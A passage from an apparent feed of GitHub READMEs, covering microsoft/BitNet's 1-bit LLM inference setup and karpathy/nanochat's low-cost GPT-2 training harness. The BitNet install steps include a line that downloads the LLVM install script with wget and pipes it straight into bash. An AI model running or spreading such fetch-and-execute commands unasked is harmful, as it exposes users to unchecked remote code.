&lt;p&gt;&lt;a href="https://github.com/user-attachments/assets/7f46b736-edec-4828-b809-4be780a3e5b1"&gt;https://github.com/user-attachments/assets/7f46b736-edec-4828-b809-4be780a3e5b1&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;What's New:&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;01/15/2026 &lt;a href="https://github.com/microsoft/BitNet/raw/main/src/README.md"&gt;BitNet CPU Inference Optimization&lt;/a&gt; &lt;img src="https://img.shields.io/badge/NEW-red" alt="NEW" /&gt;&lt;/li&gt; 
 &lt;li&gt;05/20/2025 &lt;a href="https://github.com/microsoft/BitNet/raw/main/gpu/README.md"&gt;BitNet Official GPU inference kernel&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;04/14/2025 &lt;a href="https://huggingface.co/microsoft/BitNet-b1.58-2B-4T"&gt;BitNet Official 2B Parameter Model on Hugging Face&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;02/18/2025 &lt;a href="https://arxiv.org/abs/2502.11880"&gt;Bitnet.cpp: Efficient Edge Inference for Ternary LLMs&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;11/08/2024 &lt;a href="https://arxiv.org/abs/2411.04965"&gt;BitNet a4.8: 4-bit Activations for 1-bit LLMs&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;10/21/2024 &lt;a href="https://arxiv.org/abs/2410.16144"&gt;1-bit AI Infra: Part 1.1, Fast and Lossless BitNet b1.58 Inference on CPUs&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;10/17/2024 bitnet.cpp 1.0 released.&lt;/li&gt; 
 &lt;li&gt;03/21/2024 &lt;a href="https://github.com/microsoft/unilm/raw/master/bitnet/The-Era-of-1-bit-LLMs__Training_Tips_Code_FAQ.pdf"&gt;The-Era-of-1-bit-LLMs__Training_Tips_Code_FAQ&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;02/27/2024 &lt;a href="https://arxiv.org/abs/2402.17764"&gt;The Era of 1-bit LLMs: All Large Language Models are in 1.58 Bits&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;10/17/2023 &lt;a href="https://arxiv.org/abs/2310.11453"&gt;BitNet: Scaling 1-bit Transformers for Large Language Models&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Acknowledgements&lt;/h2&gt; 
&lt;p&gt;This project is based on the &lt;a href="https://github.com/ggerganov/llama.cpp"&gt;llama.cpp&lt;/a&gt; framework. We would like to thank all the authors for their contributions to the open-source community. Also, bitnet.cpp's kernels are built on top of the Lookup Table methodologies pioneered in &lt;a href="https://github.com/microsoft/T-MAC/"&gt;T-MAC&lt;/a&gt;. For inference of general low-bit LLMs beyond ternary models, we recommend using T-MAC.&lt;/p&gt; 
&lt;h2&gt;Official Models&lt;/h2&gt; 
&lt;table&gt;  
 &lt;tbody&gt;
  &lt;tr&gt; 
   &lt;th rowspan="2"&gt;Model&lt;/th&gt; 
   &lt;th rowspan="2"&gt;Parameters&lt;/th&gt; 
   &lt;th rowspan="2"&gt;CPU&lt;/th&gt; 
   &lt;th colspan="3"&gt;Kernel&lt;/th&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;th&gt;I2_S&lt;/th&gt; 
   &lt;th&gt;TL1&lt;/th&gt; 
   &lt;th&gt;TL2&lt;/th&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td rowspan="2"&gt;&lt;a href="https://huggingface.co/microsoft/BitNet-b1.58-2B-4T"&gt;BitNet-b1.58-2B-4T&lt;/a&gt;&lt;/td&gt; 
   &lt;td rowspan="2"&gt;2.4B&lt;/td&gt; 
   &lt;td&gt;x86&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;ARM&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt;
&lt;/table&gt; 
&lt;h2&gt;Supported Models&lt;/h2&gt; 
&lt;p&gt;‚ùóÔ∏è&lt;strong&gt;We use existing 1-bit LLMs available on &lt;a href="https://huggingface.co/"&gt;Hugging Face&lt;/a&gt; to demonstrate the inference capabilities of bitnet.cpp. We hope the release of bitnet.cpp will inspire the development of 1-bit LLMs in large-scale settings in terms of model size and training tokens.&lt;/strong&gt;&lt;/p&gt; 
&lt;table&gt;  
 &lt;tbody&gt;
  &lt;tr&gt; 
   &lt;th rowspan="2"&gt;Model&lt;/th&gt; 
   &lt;th rowspan="2"&gt;Parameters&lt;/th&gt; 
   &lt;th rowspan="2"&gt;CPU&lt;/th&gt; 
   &lt;th colspan="3"&gt;Kernel&lt;/th&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;th&gt;I2_S&lt;/th&gt; 
   &lt;th&gt;TL1&lt;/th&gt; 
   &lt;th&gt;TL2&lt;/th&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td rowspan="2"&gt;&lt;a href="https://huggingface.co/1bitLLM/bitnet_b1_58-large"&gt;bitnet_b1_58-large&lt;/a&gt;&lt;/td&gt; 
   &lt;td rowspan="2"&gt;0.7B&lt;/td&gt; 
   &lt;td&gt;x86&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;ARM&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td rowspan="2"&gt;&lt;a href="https://huggingface.co/1bitLLM/bitnet_b1_58-3B"&gt;bitnet_b1_58-3B&lt;/a&gt;&lt;/td&gt; 
   &lt;td rowspan="2"&gt;3.3B&lt;/td&gt; 
   &lt;td&gt;x86&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;ARM&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td rowspan="2"&gt;&lt;a href="https://huggingface.co/HF1BitLLM/Llama3-8B-1.58-100B-tokens"&gt;Llama3-8B-1.58-100B-tokens&lt;/a&gt;&lt;/td&gt; 
   &lt;td rowspan="2"&gt;8.0B&lt;/td&gt; 
   &lt;td&gt;x86&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;ARM&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td rowspan="2"&gt;&lt;a href="https://huggingface.co/collections/tiiuae/falcon3-67605ae03578be86e4e87026"&gt;Falcon3 Family&lt;/a&gt;&lt;/td&gt; 
   &lt;td rowspan="2"&gt;1B-10B&lt;/td&gt; 
   &lt;td&gt;x86&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;ARM&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td rowspan="2"&gt;&lt;a href="https://huggingface.co/collections/tiiuae/falcon-edge-series-6804fd13344d6d8a8fa71130"&gt;Falcon-E Family&lt;/a&gt;&lt;/td&gt; 
   &lt;td rowspan="2"&gt;1B-3B&lt;/td&gt; 
   &lt;td&gt;x86&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;ARM&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt;
&lt;/table&gt; 
&lt;h2&gt;Installation&lt;/h2&gt; 
&lt;h3&gt;Requirements&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;python&amp;gt;=3.9&lt;/li&gt; 
 &lt;li&gt;cmake&amp;gt;=3.22&lt;/li&gt; 
 &lt;li&gt;clang&amp;gt;=18 
  &lt;ul&gt; 
   &lt;li&gt; &lt;p&gt;For Windows users, install &lt;a href="https://visualstudio.microsoft.com/downloads/"&gt;Visual Studio 2022&lt;/a&gt;. In the installer, toggle on at least the following options(this also automatically installs the required additional tools like CMake):&lt;/p&gt; 
    &lt;ul&gt; 
     &lt;li&gt;Desktop-development with C++&lt;/li&gt; 
     &lt;li&gt;C++-CMake Tools for Windows&lt;/li&gt; 
     &lt;li&gt;Git for Windows&lt;/li&gt; 
     &lt;li&gt;C++-Clang Compiler for Windows&lt;/li&gt; 
     &lt;li&gt;MS-Build Support for LLVM-Toolset (clang)&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
   &lt;li&gt; &lt;p&gt;For Debian/Ubuntu users, you can download with &lt;a href="https://apt.llvm.org/"&gt;Automatic installation script&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;code&gt;bash -c "$(wget -O - https://apt.llvm.org/llvm.sh)"&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;conda (highly recommend)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Build from source&lt;/h3&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!IMPORTANT] If you are using Windows, please remember to always use a Developer Command Prompt / PowerShell for VS2022 for the following commands. Please refer to the FAQs below if you see any issues.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;ol&gt; 
 &lt;li&gt;Clone the repo&lt;/li&gt; 
&lt;/ol&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;git clone --recursive https://github.com/microsoft/BitNet.git
cd BitNet
&lt;/code&gt;&lt;/pre&gt; 
&lt;ol start="2"&gt; 
 &lt;li&gt;Install the dependencies&lt;/li&gt; 
&lt;/ol&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# (Recommended) Create a new conda environment
conda create -n bitnet-cpp python=3.9
conda activate bitnet-cpp

pip install -r requirements.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;ol start="3"&gt; 
 &lt;li&gt;Build the project&lt;/li&gt; 
&lt;/ol&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# Manually download the model and run with local path
huggingface-cli download microsoft/BitNet-b1.58-2B-4T-gguf --local-dir models/BitNet-b1.58-2B-4T
python setup_env.py -md models/BitNet-b1.58-2B-4T -q i2_s

&lt;/code&gt;&lt;/pre&gt; 
&lt;pre&gt;
usage: setup_env.py [-h] [--hf-repo {1bitLLM/bitnet_b1_58-large,1bitLLM/bitnet_b1_58-3B,HF1BitLLM/Llama3-8B-1.58-100B-tokens,tiiuae/Falcon3-1B-Instruct-1.58bit,tiiuae/Falcon3-3B-Instruct-1.58bit,tiiuae/Falcon3-7B-Instruct-1.58bit,tiiuae/Falcon3-10B-Instruct-1.58bit}] [--model-dir MODEL_DIR] [--log-dir LOG_DIR] [--quant-type {i2_s,tl1}] [--quant-embd]
                    [--use-pretuned]

Setup the environment for running inference

optional arguments:
  -h, --help            show this help message and exit
  --hf-repo {1bitLLM/bitnet_b1_58-large,1bitLLM/bitnet_b1_58-3B,HF1BitLLM/Llama3-8B-1.58-100B-tokens,tiiuae/Falcon3-1B-Instruct-1.58bit,tiiuae/Falcon3-3B-Instruct-1.58bit,tiiuae/Falcon3-7B-Instruct-1.58bit,tiiuae/Falcon3-10B-Instruct-1.58bit}, -hr {1bitLLM/bitnet_b1_58-large,1bitLLM/bitnet_b1_58-3B,HF1BitLLM/Llama3-8B-1.58-100B-tokens,tiiuae/Falcon3-1B-Instruct-1.58bit,tiiuae/Falcon3-3B-Instruct-1.58bit,tiiuae/Falcon3-7B-Instruct-1.58bit,tiiuae/Falcon3-10B-Instruct-1.58bit}
                        Model used for inference
  --model-dir MODEL_DIR, -md MODEL_DIR
                        Directory to save/load the model
  --log-dir LOG_DIR, -ld LOG_DIR
                        Directory to save the logging info
  --quant-type {i2_s,tl1}, -q {i2_s,tl1}
                        Quantization type
  --quant-embd          Quantize the embeddings to f16
  --use-pretuned, -p    Use the pretuned kernel parameters
&lt;/pre&gt; 
&lt;h2&gt;Usage&lt;/h2&gt; 
&lt;h3&gt;Basic usage&lt;/h3&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# Run inference with the quantized model
python run_inference.py -m models/BitNet-b1.58-2B-4T/ggml-model-i2_s.gguf -p "You are a helpful assistant" -cnv
&lt;/code&gt;&lt;/pre&gt; 
&lt;pre&gt;
usage: run_inference.py [-h] [-m MODEL] [-n N_PREDICT] -p PROMPT [-t THREADS] [-c CTX_SIZE] [-temp TEMPERATURE] [-cnv]

Run inference

optional arguments:
  -h, --help            show this help message and exit
  -m MODEL, --model MODEL
                        Path to model file
  -n N_PREDICT, --n-predict N_PREDICT
                        Number of tokens to predict when generating text
  -p PROMPT, --prompt PROMPT
                        Prompt to generate text from
  -t THREADS, --threads THREADS
                        Number of threads to use
  -c CTX_SIZE, --ctx-size CTX_SIZE
                        Size of the prompt context
  -temp TEMPERATURE, --temperature TEMPERATURE
                        Temperature, a hyperparameter that controls the randomness of the generated text
  -cnv, --conversation  Whether to enable chat mode or not (for instruct models.)
                        (When this option is turned on, the prompt specified by -p will be used as the system prompt.)
&lt;/pre&gt; 
&lt;h3&gt;Benchmark&lt;/h3&gt; 
&lt;p&gt;We provide scripts to run the inference benchmark providing a model.&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;usage: e2e_benchmark.py -m MODEL [-n N_TOKEN] [-p N_PROMPT] [-t THREADS]  
   
Setup the environment for running the inference  
   
required arguments:  
  -m MODEL, --model MODEL  
                        Path to the model file. 
   
optional arguments:  
  -h, --help  
                        Show this help message and exit. 
  -n N_TOKEN, --n-token N_TOKEN  
                        Number of generated tokens. 
  -p N_PROMPT, --n-prompt N_PROMPT  
                        Prompt to generate text from. 
  -t THREADS, --threads THREADS  
                        Number of threads to use. 
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Here's a brief explanation of each argument:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;-m&lt;/code&gt;, &lt;code&gt;--model&lt;/code&gt;: The path to the model file. This is a required argument that must be provided when running the script.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;-n&lt;/code&gt;, &lt;code&gt;--n-token&lt;/code&gt;: The number of tokens to generate during the inference. It is an optional argument with a default value of 128.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;-p&lt;/code&gt;, &lt;code&gt;--n-prompt&lt;/code&gt;: The number of prompt tokens to use for generating text. This is an optional argument with a default value of 512.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;-t&lt;/code&gt;, &lt;code&gt;--threads&lt;/code&gt;: The number of threads to use for running the inference. It is an optional argument with a default value of 2.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;-h&lt;/code&gt;, &lt;code&gt;--help&lt;/code&gt;: Show the help message and exit. Use this argument to display usage information.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;For example:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-sh"&gt;python utils/e2e_benchmark.py -m /path/to/model -n 200 -p 256 -t 4  
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This command would run the inference benchmark using the model located at &lt;code&gt;/path/to/model&lt;/code&gt;, generating 200 tokens from a 256 token prompt, utilizing 4 threads.&lt;/p&gt; 
&lt;p&gt;For the model layout that do not supported by any public model, we provide scripts to generate a dummy model with the given model layout, and run the benchmark on your machine:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;python utils/generate-dummy-bitnet-model.py models/bitnet_b1_58-large --outfile models/dummy-bitnet-125m.tl1.gguf --outtype tl1 --model-size 125M

# Run benchmark with the generated model, use -m to specify the model path, -p to specify the prompt processed, -n to specify the number of token to generate
python utils/e2e_benchmark.py -m models/dummy-bitnet-125m.tl1.gguf -p 512 -n 128
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Convert from &lt;code&gt;.safetensors&lt;/code&gt; Checkpoints&lt;/h3&gt; 
&lt;pre&gt;&lt;code class="language-sh"&gt;# Prepare the .safetensors model file
huggingface-cli download microsoft/bitnet-b1.58-2B-4T-bf16 --local-dir ./models/bitnet-b1.58-2B-4T-bf16

# Convert to gguf model
python ./utils/convert-helper-bitnet.py ./models/bitnet-b1.58-2B-4T-bf16
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;FAQ (Frequently Asked Questions)üìå&lt;/h3&gt; 
&lt;h4&gt;Q1: The build dies with errors building llama.cpp due to issues with std::chrono in log.cpp?&lt;/h4&gt; 
&lt;p&gt;&lt;strong&gt;A:&lt;/strong&gt; This is an issue introduced in recent version of llama.cpp. Please refer to this &lt;a href="https://github.com/tinglou/llama.cpp/commit/4e3db1e3d78cc1bcd22bcb3af54bd2a4628dd323"&gt;commit&lt;/a&gt; in the &lt;a href="https://github.com/abetlen/llama-cpp-python/issues/1942"&gt;discussion&lt;/a&gt; to fix this issue.&lt;/p&gt; 
&lt;h4&gt;Q2: How to build with clang in conda environment on windows?&lt;/h4&gt; 
&lt;p&gt;&lt;strong&gt;A:&lt;/strong&gt; Before building the project, verify your clang installation and access to Visual Studio tools by running:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;clang -v
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This command checks that you are using the correct version of clang and that the Visual Studio tools are available. If you see an error message such as:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;'clang' is not recognized as an internal or external command, operable program or batch file.
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;It indicates that your command line window is not properly initialized for Visual Studio tools.&lt;/p&gt; 
&lt;p&gt;‚Ä¢ If you are using Command Prompt, run:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;"C:\Program Files\Microsoft Visual Studio\2022\Professional\Common7\Tools\VsDevCmd.bat" -startdir=none -arch=x64 -host_arch=x64
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;‚Ä¢ If you are using Windows PowerShell, run the following commands:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;Import-Module "C:\Program Files\Microsoft Visual Studio\2022\Professional\Common7\Tools\Microsoft.VisualStudio.DevShell.dll" Enter-VsDevShell 3f0e31ad -SkipAutomaticLocation -DevCmdArguments "-arch=x64 -host_arch=x64"
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;These steps will initialize your environment and allow you to use the correct Visual Studio tools.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>karpathy/nanochat</title>
      <link>https://github.com/karpathy/nanochat</link>
      <description>&lt;p&gt;The best ChatGPT that $100 can buy.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;nanochat&lt;/h1&gt; 
&lt;p&gt;&lt;img src="https://raw.githubusercontent.com/karpathy/nanochat/master/dev/nanochat.png" alt="nanochat logo" /&gt; &lt;img src="https://raw.githubusercontent.com/karpathy/nanochat/master/dev/scaling_laws_jan26.png" alt="scaling laws" /&gt;&lt;/p&gt; 
&lt;p&gt;nanochat is the simplest experimental harness for training LLMs. It is designed to run on a single GPU node, the code is minimal/hackable, and it covers all major LLM stages including tokenization, pretraining, finetuning, evaluation, inference, and a chat UI. For example, you can train your own GPT-2 capability LLM (which cost ~$50,000 to train in 2019) for only $73 (3 hours of 8XH100 GPU node) and then talk to it in a familiar ChatGPT-like web UI.&lt;/p&gt; 
&lt;p&gt;For questions about the repo, I recommend either using &lt;a href="https://deepwiki.com/karpathy/nanochat"&gt;DeepWiki&lt;/a&gt; from Devin/Cognition to ask questions about the repo, or use the &lt;a href="https://github.com/karpathy/nanochat/discussions"&gt;Discussions tab&lt;/a&gt;, or come by the &lt;a href="https://discord.com/channels/1020383067459821711/1427295580895314031"&gt;#nanochat&lt;/a&gt; channel on Discord.&lt;/p&gt; 
&lt;h2&gt;Updates&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;(Jan 31 2026) Major revamp of all scripts/README ongoing, deleting midtraining stage, might be a bit messy briefly...&lt;/li&gt; 
 &lt;li&gt;(Jan 30 2026) With all the latest improvements we're able to train GPT-2 grade LLM in about $73. The &lt;a href="https://raw.githubusercontent.com/karpathy/nanochat/master/runs/speedrun.sh"&gt;runs/speedrun.sh&lt;/a&gt; script will become the refernece way to train GPT-2 grade model and talk to it.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Leaderboard&lt;/h2&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;#&lt;/th&gt; 
   &lt;th&gt;time&lt;/th&gt; 
   &lt;th&gt;val_bpb&lt;/th&gt; 
   &lt;th&gt;CORE&lt;/th&gt; 
   &lt;th&gt;Description&lt;/th&gt; 
   &lt;th&gt;Date&lt;/th&gt; 
   &lt;th&gt;Commit&lt;/th&gt; 
   &lt;th&gt;Contributors&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;0&lt;/td&gt; 
   &lt;td&gt;168 hours&lt;/td&gt; 
   &lt;td&gt;-&lt;/td&gt; 
   &lt;td&gt;0.2565&lt;/td&gt; 
   &lt;td&gt;Original OpenAI GPT-2 checkpoint&lt;/td&gt; 
   &lt;td&gt;2019&lt;/td&gt; 
   &lt;td&gt;-&lt;/td&gt; 
   &lt;td&gt;OpenAI&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;1&lt;/td&gt; 
   &lt;td&gt;3.04&lt;/td&gt; 
   &lt;td&gt;0.74833&lt;/td&gt; 
   &lt;td&gt;0.2585&lt;/td&gt; 
   &lt;td&gt;d24 baseline, slightly overtrained&lt;/td&gt; 
   &lt;td&gt;Jan 29 2026&lt;/td&gt; 
   &lt;td&gt;348fbb3&lt;/td&gt; 
   &lt;td&gt;@karpathy&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;2&lt;/td&gt; 
   &lt;td&gt;2.91&lt;/td&gt; 
   &lt;td&gt;0.74504&lt;/td&gt; 
   &lt;td&gt;0.2578&lt;/td&gt; 
   &lt;td&gt;d26 slightly undertrained &lt;strong&gt;+fp8&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Feb 2 2026&lt;/td&gt; 
   &lt;td&gt;8309b83&lt;/td&gt; 
   &lt;td&gt;@karpathy&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;The primary metric we care about is "time to GPT-2" - the wall clock time needed to outperform the GPT-2 (1.6B) CORE metric on an 8XH100 GPU node. The GPT-2 CORE score is 0.256525. In 2019, the training of GPT-2 cost approximately $50,000 so it is incredible that due to many advances over 7 years across the stack, we can now do so much faster and for well below $100 (e.g. at the current ~$3/GPU/hr, an 8XH100 node is ~$24/hr, so 3 hours is ~$72).&lt;/p&gt; 
&lt;p&gt;See &lt;a href="https://raw.githubusercontent.com/karpathy/nanochat/master/dev/LEADERBOARD.md"&gt;dev/LEADERBOARD.md&lt;/a&gt; for more docs on how to interpret and contribute to the leaderboard.&lt;/p&gt; 
&lt;h2&gt;Getting started&lt;/h2&gt; 
&lt;h3&gt;Reproduce and talk to GPT-2&lt;/h3&gt; 
&lt;p&gt;The most fun you can have is to train your own GPT-2 and talk to it. The entire pipeline to do so is contained in the single file &lt;a href="https://raw.githubusercontent.com/karpathy/nanochat/master/runs/speedrun.sh"&gt;runs/speedrun.sh&lt;/a&gt;, which is designed to be run on an 8XH100 GPU node. Currently, at ~$24/hour for these nodes, pretraining GPT-2 grade model takes approximately 3 hours and will set you back about $75. Boot up a new 8XH100 GPU box from your favorite provider (e.g. I use and like &lt;a href="https://lambda.ai/service/gpu-cloud"&gt;Lambda&lt;/a&gt;), and kick off the training script:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;bash runs/speedrun.sh
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;You mish to do so in a screen session as this will take ~3 hours to run. Once it's done, you can talk to it via the ChatGPT-like web UI. Make sure again that your local uv virtual environment is active (run &lt;code&gt;source .venv/bin/activate&lt;/code&gt;), and serve it:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;python -m scripts.chat_web
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;And then visit the URL shown. Make sure to access it correctly, e.g. on Lambda use the public IP of the node you're on, followed by the port, so for example &lt;a href="http://209.20.xxx.xxx:8000/"&gt;http://209.20.xxx.xxx:8000/&lt;/a&gt;, etc. Then talk to your LLM as you'd normally talk to ChatGPT! Get it to write stories or poems. Ask it to tell you who you are to see a hallucination. Ask it why the sky is blue. Or why it's green. The speedrun is a 4e19 FLOPs capability model so it's a bit like talking to a kindergartener :).&lt;/p&gt; 
&lt;hr /&gt; 
&lt;img width="2672" height="1520" alt="image" src="https://github.com/user-attachments/assets/ed39ddf8-2370-437a-bedc-0f39781e76b5" /&gt; 
&lt;hr /&gt; 
&lt;p&gt;A few more notes:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;The code will run just fine on the Ampere 8XA100 GPU node as well, but a bit slower.&lt;/li&gt; 
 &lt;li&gt;All code will run just fine on even a single GPU by omitting &lt;code&gt;torchrun&lt;/code&gt;, and will produce ~identical results (code will automatically switch to gradient accumulation), but you'll have to wait 8 times longer.&lt;/li&gt; 
 &lt;li&gt;If your GPU(s) have less than 80GB, you'll have to tune some of the hyperparameters or you will OOM / run out of VRAM. Look for &lt;code&gt;--device_batch_size&lt;/code&gt; in the scripts and reduce it until things fit. E.g. from 32 (default) to 16, 8, 4, 2, or even 1. Less than that you'll have to know a bit more what you're doing and get more creative.&lt;/li&gt; 
 &lt;li&gt;Most of the code is fairly vanilla PyTorch so it should run on anything that supports that - xpu, mps, or etc, but I haven't personally exercised all of these code paths so there might be sharp edges.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Research&lt;/h2&gt; 
&lt;p&gt;If you are a researcher and wish to help improve nanochat, two scripts of interest are &lt;a href="https://raw.githubusercontent.com/karpathy/nanochat/master/runs/scaling_laws.sh"&gt;runs/scaling_laws.sh&lt;/a&gt; and &lt;a href="https://raw.githubusercontent.com/karpathy/nanochat/master/runs/miniseries.sh"&gt;runs/miniseries.sh&lt;/a&gt;. See &lt;a href="https://github.com/karpathy/nanochat/discussions/420"&gt;Jan 7 miniseries v1&lt;/a&gt; for related documentation. For quick experimentation (~5 min pretraining runs) my favorite scale is to train a 12-layer model (GPT-1 sized), e.g. like this:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;OMP_NUM_THREADS=1 torchrun --standalone --nproc_per_node=8 -m scripts.base_train -- \
    --depth=12 \
    --run="d12" \
    --model-tag="d12" \
    --core-metric-every=999999 \
    --sample-every=-1 \
    --save-every=-1 \
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This uses wandb (run name "d12"), only runs the CORE metric on last step, and it doesn't sample and save intermediate checkpoints. I like to change something in the code, re-run a d12 (or a d16 etc) and see if it helped, in an iteration loop.&lt;/p&gt; 
&lt;p&gt;The overall approach is to treat the depth of the model as the single dial of complexity. By sweeping out the depth, we get increasingly more powerful models. We determine the scaling laws, set the data budget to a compute optimal setting, train a whole miniseries of models of increasing sizes, and compare them to the GPT-2 and GPT-3 miniseries. Right now, beating GPT-2 specifically faster and faster is the most interesting target.&lt;/p&gt; 
&lt;h2&gt;Running on CPU / MPS&lt;/h2&gt; 
&lt;p&gt;The script &lt;a href="https://raw.githubusercontent.com/karpathy/nanochat/master/runs/runcpu.sh"&gt;runs/runcpu.sh&lt;/a&gt; shows a very simple example of running on CPU or Apple Silicon. It dramatically shrinks the LLM tha tis being trained to make things fit into a reasonable time interval of a few ten minutes of training. You will not get strong results in this way.&lt;/p&gt; 
&lt;h2&gt;Guides&lt;/h2&gt; 
&lt;p&gt;I've published a number of guides that might contain helpful information:&lt;/p&gt; 
&lt;ul&gt; 
